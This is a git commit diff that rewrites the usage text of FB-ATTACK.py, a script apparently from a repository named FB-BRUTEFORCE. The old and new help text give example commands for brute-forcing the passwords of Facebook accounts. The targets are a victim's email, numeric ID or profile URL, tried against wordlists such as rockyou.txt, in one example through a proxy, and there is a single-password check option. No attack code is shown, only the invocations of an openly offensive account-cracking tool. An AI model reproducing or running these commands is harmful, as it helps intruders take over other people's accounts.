0aba2bf6ad35ac9b899e14ddb2277b764af33f6e
[DEV_SANJAY] <144456077+WHITEDH4CKER@users.noreply.github.com>
2024-01-05 20:38:37 +0530

    Update FB-ATTACK.py

--- FB-ATTACK.py
+++ FB-ATTACK.py
@@ -181,22 +181,17 @@ if __name__ == "__main__":
     main()
                 
 parse = optparse.OptionParser(wi+"""
-Usage: python FB-ATTACK.py [OPTIONS...]
-https://github.com/WHITEDH4CKER/FB-BRUTEFORCE  
-
-Examples:
-        |
-     |--------
-     | python FB-ATTACK.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
-     |--------
-     | python FB-ATTACK.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
-     |--------
-     | python FB-ATTACK.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
-     |--------
-     | python FB-ATTACK.py -t Victim@gmail.com -s 1234567
-     |--------
-     | python FB-ATTACK.py -g https://www.facebook.com/Victim_Profile
-     |--------
+            Usage: python FB-ATTACK.py -t "target_id" -w "wordlist_location" 
+   Examples:
+     |-------->
+     | python FB-ATTACK.py -g https://facebook.com/target_profile_url_for_get_id
+     |-------->
+     | python FB-ATTACK.py -t 100001013078780 -w 10MPASS.txt 
+     |-------->
+     | python FB-ATTACK.py -t target@gmail.com -w 10MPASS.txt
+     |-------->
+     |python FB-ATTACK.py -t target@gmail.com -s checkpassword
+     |-------->
 """)
 
 
